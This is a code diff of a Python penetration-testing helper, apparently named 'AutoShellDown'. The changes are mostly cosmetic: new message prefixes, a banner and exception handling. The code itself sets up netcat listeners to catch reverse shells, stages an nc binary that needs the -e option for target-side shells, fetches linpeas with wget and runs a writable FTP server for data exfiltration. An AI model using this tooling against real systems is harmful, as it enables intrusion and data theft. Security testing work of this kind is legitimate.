@@ -29,7 +29,7 @@ def get_file(tmp_dir, ip, lport, p, filename):
 def reverse_shell_recon(tmp_dir, port, current_os, lport, ip, mport):
     p = process("/bin/bash")  # Spawns a process
     p.sendline(f"nc -lvnp {port}".encode())
-    print(f"Reverse shell_recon listening on port {port}")
+    print(f"[+] Reverse shell_recon listening on port {port}")
     needle = "connect to"
     # Wait for needle to appear in the output
     p.recvuntil(needle.encode())
@@ -52,13 +52,13 @@ def reverse_shell_recon(tmp_dir, port, current_os, lport, ip, mport):
 def file_server(lport):
     p = process("/bin/bash")
     p.sendline(f"python3 -m http.server {lport}".encode())
-    print(f"File server is listening on port {lport}")
+    print(f"[+] File server is listening on port {lport}")
 
 
 def manual_shell(mport):
     p = process("/bin/bash")
     p.sendline(f"nc -lvnp {mport}".encode())
-    print(f"Manual shell listening on port {mport}")
+    print(f"[+] Manual shell listening on port {mport}")
     needle = "connect to"
     # Wait for needle to appear in the output
     p.recvuntil(needle.encode())
@@ -80,76 +80,67 @@ def checks(args):
     # Sudo check if -d is used
     if args.dport is not None:
         if os.geteuid() != 0 and args.dport < 1024:
-            print(f"You need to have root privileges to run pyftpdlib on port {args.dport}.")
+            print(f"[X] You need to have root privileges to run pyftpdlib on port {args.dport}.")
             return False
         else:
-            print(f"FTP Server will run on port {args.dport}")
+            print(f"[+] FTP Server will run on port {args.dport}")
 
     # Check if linpeas is present
     if os.path.exists("./www/linpeas.sh"):
-        print("The file exists")
+        print("[+] Linpeas is present in the www directory")
 
     else:
-        print("The file doesn't exist on the local machine")
+        print("[!] The file doesn't exist on the local machine")
         # Prompt the user to download the file
-        download = input("Do you want to download the file? /!\\ Might be outdated /!\\ (y/n):").strip()
+        download = input("[?] Do you want to download the file? /!\\ Might be outdated /!\\ (y/n):").strip()
         if download == 'y':
             # Download the file
-            print("Downloading the file...")
+            print("[+] Downloading the file...")
             os.system("wget https://github.com/carlospolop/PEASS-ng/releases/download/20230219/linpeas.sh -O ./www/linpeas.sh")
 
         else:
             # Prompt to continue without linpeas
-            continue_without_linpeas = input("Do you want to continue without linpeas? (y/n): ").strip()
+            continue_without_linpeas = input("[?] Do you want to continue without linpeas? (y/n): ").strip()
             if continue_without_linpeas == 'y':
-                print("Continuing without linpeas")
+                print("[+] Continuing without linpeas")
             else:
                 return False
 
     # Check if correct nc is present if not copy it and check if it is compatible
     if os.path.exists("./www/nc"):
-        print("The nc is in the www folder")
+        print("[+] The nc binary is in the www folder")
+        print("[!] Make sure the nc has the -e option! As the script uses does not check for it!")
         # Nc is present compatability is not checked!
         return True
 
     else:
-        print("The nc is not in the www folder copying it from /bin/nc")
-        print("Make sure the nc has the -e option! As the script uses does not check for it!")
+        print("[!] The nc is not in the www folder copying it from /bin/nc")
+        print("[+] Make sure the nc has the -e option! As the script uses does not check for it!")
         os.system("cp /bin/nc ./www/nc")
         return True
-
-
-        ### OLD CODE ###
-        # This code is not used anymore as it does not work
-        # Check if the nc version is compatible
-        #p = process("/bin/bash")
-        #p.sendline("nc -e".encode())
-        #needle = "invalid option"
-        # read stdout if needle appears exit
-        #if p.recvuntil(needle.encode()):
-            #print("The current nc version is not compatible with the script")
-            #print("Are you using kali? "
-            #      "nc with the -e option is not present")
-            # Kill the process
-            #p.kill()
-            #return False
-
-        #else:
-            #print("The nc version is compatible")
-            # cppy the nc to the www folder
-            #os.system("cp /bin/nc ./www/nc")
-            #return True
 
 
 # Function to start the ftp server if -d is used
 def data_exfiltration(dport):
     p = process("/bin/bash")
-    print("Starting the ftp server...")
+    print("[+] Starting the ftp server...")
     p.sendline("cd ./exfil".encode())
     p.sendline(f"python -m pyftpdlib -p {dport} --write".encode())
 
 
 def main():
+
+    print(r"""
+             __         __
+ /\    |_ _ (_ |_  _ |||  \ _      _
+/--\|_||_(_)__)| )(-`|||__/(_)\/\/| )
+    
+    Version: 1.0.0
+    Listener, File Hosting, and Exfiltration
+    Author: Mario Vata
+    
+    """)
+
     # Parse the arguments
     args = parse_args()
 
@@ -160,7 +151,8 @@ def main():
 
     # Create a temporary directory
     tmp_dir = "/tmp/" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
-    print(tmp_dir)
+    # Print the temporary directory
+    print(f"[+] Temporary directory: {tmp_dir}")
 
     # Get the arguments
     lport = args.lport
@@ -182,4 +174,13 @@ def main():
 
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("Exiting...")
+        sys.exit(0)
+    except SystemExit:
+        raise
+    except:
+        print("[X] Unexpected error:", sys.exc_info()[0])
+        raise
